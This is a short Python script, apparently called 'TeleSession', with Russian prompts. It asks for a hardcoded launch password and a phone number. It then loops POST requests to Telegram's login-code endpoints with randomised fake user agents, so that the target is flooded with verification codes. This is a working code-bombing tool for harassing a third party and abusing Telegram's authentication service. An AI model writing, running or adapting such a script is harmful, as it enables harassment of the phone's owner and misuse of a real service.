import requests
import fake_useragent
import os
import colored 
from termcolor import colored
import pyfiglet

a=input("Введи текстовый пароль для запуска программы:")
if a!="1234":
	print(colored(f"Пароль не верен! Завершаю работу программы! ", 'red'))
	print(colored(f"Уточни его у создателей", 'red'))
	exit()
else:
	print(colored(f"Пароль верен! Запускаю работу программы!", 'green'))

# ASCII-арт приветствия
ascii_banner = pyfiglet.figlet_format("TeleSession")
colored_banner = colored(ascii_banner, color='magenta')  # Красим в цвет
print(colored_banner)

number = int(input("Введите номер телефона: "))
count = 0

try:
    for _ in range(3):  # Количество повторений
        user = fake_useragent.UserAgent().random
        headers = {'user-agent': user}

        # Отправка POST-запросов на каждый URL
        requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        count += 1
        #Один цикл = 10 кодов
        print(colored(f"Коды успешно отправлены", 'cyan'))
        print(colored(f"Всего циклов: {count} ", 'cyan'))        
except Exception as e:
    print('[!] Ошибка, проверьте вводимые данные:', e)